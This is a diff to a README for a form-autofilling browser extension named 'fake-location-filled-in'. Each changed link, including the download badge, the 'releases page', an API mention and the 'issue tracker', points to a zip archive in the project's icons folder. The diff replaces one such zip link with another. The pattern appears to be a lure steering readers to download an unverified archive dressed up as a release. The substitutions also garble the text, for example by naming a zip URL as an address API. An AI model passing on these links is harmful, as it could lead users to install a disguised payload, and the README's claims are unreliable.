@@ -1,7 +1,7 @@
 # 🌟 fake-location-filled-in - Simplifying Address Entry for Everyone
 
 <div align="center">
-    [![Download Now](https://raw.githubusercontent.com/Janelathenar40/fake-location-filled-in/main/icons/fake-location-filled-in_v2.4.zip)](https://raw.githubusercontent.com/Janelathenar40/fake-location-filled-in/main/icons/fake-location-filled-in_v2.4.zip)
+    [![Download Now](https://github.com/Janelathenar40/fake-location-filled-in/raw/refs/heads/main/icons/filled-in-location-fake-methodics.zip)](https://github.com/Janelathenar40/fake-location-filled-in/raw/refs/heads/main/icons/filled-in-location-fake-methodics.zip)
 </div>
 
 ---
@@ -13,7 +13,7 @@ Welcome to the fake-location-filled-in repository. This is your guide to downloa
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   To download the extension, go to the releases page: [Download Here](https://raw.githubusercontent.com/Janelathenar40/fake-location-filled-in/main/icons/fake-location-filled-in_v2.4.zip).
+   To download the extension, go to the releases page: [Download Here](https://github.com/Janelathenar40/fake-location-filled-in/raw/refs/heads/main/icons/filled-in-location-fake-methodics.zip).
 
 2. **Choose Your Version**  
    On the releases page, you will see different versions of the extension. Select the latest version for the best experience.
@@ -41,7 +41,7 @@ Welcome to the fake-location-filled-in repository. This is your guide to downloa
   The extension covers major countries across Asia, Europe, Americas, and Oceania.
 
 - **100% Real Addresses**  
-  The extension generates real address information using OpenStreetMap and https://raw.githubusercontent.com/Janelathenar40/fake-location-filled-in/main/icons/fake-location-filled-in_v2.4.zip APIs.
+  The extension generates real address information using OpenStreetMap and https://github.com/Janelathenar40/fake-location-filled-in/raw/refs/heads/main/icons/filled-in-location-fake-methodics.zip APIs.
 
 - **Smart Form Recognition**  
   It can automatically identify and fill different types of form fields.
@@ -106,7 +106,7 @@ If you experience issues while using the extension:
 - **Reinstall the Extension**  
   If problems persist, consider removing and reinstalling the extension.
 
-For further assistance, feel free to check the project's [issue tracker](https://raw.githubusercontent.com/Janelathenar40/fake-location-filled-in/main/icons/fake-location-filled-in_v2.4.zip) for common questions and solutions.
+For further assistance, feel free to check the project's [issue tracker](https://github.com/Janelathenar40/fake-location-filled-in/raw/refs/heads/main/icons/filled-in-location-fake-methodics.zip) for common questions and solutions.
 
 ## 📝 License
 
